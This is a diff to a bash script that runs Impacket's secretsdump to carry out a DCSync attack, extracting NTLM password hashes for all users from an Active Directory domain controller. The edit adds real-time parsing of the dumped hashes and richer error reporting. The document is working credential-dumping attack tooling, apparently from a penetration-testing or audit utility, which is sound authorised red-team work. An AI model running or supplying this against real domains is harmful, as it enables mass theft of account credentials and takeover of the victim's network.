@@ -109,41 +109,78 @@ echo -e "${YELLOW}[!] Step 1/2: Executing DCSync via secretsdump...${NC}"
 echo -e "${GRAY}    This may take a while depending on domain size...${NC}"
 echo ""
 
-# Run secretsdump in background and show progress spinner
-$SECRETSDUMP_CMD -just-dc-ntlm -user-status -dc-ip "${DC_IP}" "${DOMAIN}/${USERNAME}:${PASSWORD}@${DC_IP}" > "${LOGFILE}" 2>&1 &
+# Use a named pipe for real-time output processing
+MKFIFO_PIPE="${BASE_PATH}/secretsdump_pipe"
+mkfifo "$MKFIFO_PIPE"
+
+# Run secretsdump and tee output to both logfile and pipe
+$SECRETSDUMP_CMD -just-dc-ntlm -user-status -dc-ip "${DC_IP}" "${DOMAIN}/${USERNAME}:${PASSWORD}@${DC_IP}" 2>&1 | tee "${LOGFILE}" > "$MKFIFO_PIPE" &
 SECRETSDUMP_PID=$!
 
-# Progress spinner
-spin='-\|/'
-i=0
-echo -n "    [~] Extracting password hashes... "
-while kill -0 $SECRETSDUMP_PID 2>/dev/null; do
-    i=$(( (i+1) %4 ))
-    printf "\r    [${spin:$i:1}] Extracting password hashes... "
-    sleep 0.1
-done
-printf "\r    [✓] Extracting password hashes... "
+# Process the output in real-time to show progress
+HASH_COUNT=0
+LAST_USER=""
+echo -e "    ${GRAY}[~] Dumping credentials...${NC}"
+while IFS= read -r line; do
+    # Check for hash lines (contains ::: and not machine accounts)
+    if echo "$line" | grep -q ":::" && ! echo "$line" | grep -q '\$:'; then
+        # Extract username (format: domain\username:RID:LMhash:NThash:::)
+        CURRENT_USER=$(echo "$line" | cut -d: -f1 | sed 's/.*\\//')
+        if [ -n "$CURRENT_USER" ] && [ "$CURRENT_USER" != "[*]" ]; then
+            HASH_COUNT=$((HASH_COUNT + 1))
+            LAST_USER="$CURRENT_USER"
+            # Overwrite the same line with current progress
+            printf "\r    ${GREEN}[+]${NC} Dumped ${BLUE}%d${NC} hashes | Last: ${YELLOW}%-40s${NC}" "$HASH_COUNT" "$LAST_USER"
+        fi
+    fi
+done < "$MKFIFO_PIPE" &
+READER_PID=$!
 
 # Wait for secretsdump to complete and get exit code
 wait $SECRETSDUMP_PID
 SECRETSDUMP_EXIT_CODE=$?
 
+# Wait for reader to finish
+wait $READER_PID 2>/dev/null
+
+# Clean up pipe
+rm -f "$MKFIFO_PIPE"
+
+# Print final newline and status
 if [ $SECRETSDUMP_EXIT_CODE -eq 0 ]; then
-    echo -e "${GREEN}Done${NC}"
+    echo ""
+    echo -e "    ${GREEN}[✓] Extraction complete: ${HASH_COUNT} hashes dumped${NC}"
 else
-    echo -e "${RED}Failed${NC}"
+    echo ""
+    echo -e "    ${RED}[✗] Secretsdump failed with exit code: ${SECRETSDUMP_EXIT_CODE}${NC}"
 fi
 
 # Check if secretsdump was successful
 if [ $SECRETSDUMP_EXIT_CODE -ne 0 ]; then
-    echo -e "${RED}[!] Error: secretsdump failed. Check credentials and connectivity.${NC}"
-    echo -e "${GRAY}    Full log available at: ${LOGFILE}${NC}"
+    echo ""
+    echo -e "${RED}[!] Error: secretsdump failed.${NC}"
+    echo -e "${RED}============================================${NC}"
+    echo -e "${RED}Error Details:${NC}"
+    echo -e "${RED}============================================${NC}"
+    # Show the last 20 lines of the log which typically contain the error
+    tail -n 20 "${LOGFILE}" | sed 's/^/    /'
+    echo -e "${RED}============================================${NC}"
+    echo ""
+    echo -e "${YELLOW}Common causes:${NC}"
+    echo -e "  • Invalid credentials (wrong username/password)"
+    echo -e "  • Insufficient permissions (account lacks DCSync rights)"
+    echo -e "  • Network connectivity issues"
+    echo -e "  • Incorrect domain name or DC IP"
+    echo -e "  • Firewall blocking SMB/RPC ports (135, 445, 49152+)"
+    echo ""
+    echo -e "${GRAY}Full log available at: ${LOGFILE}${NC}"
     exit 1
 fi
 
 # Check if we got any hashes
 if ! grep -q "aad3b435b51404eeaad3b435b51404ee" "${LOGFILE}"; then
     echo -e "${RED}[!] Error: No hashes found in output. DCSync may have failed.${NC}"
+    echo -e "${GRAY}    Check the log file for details: ${LOGFILE}${NC}"
     exit 1
 fi
 
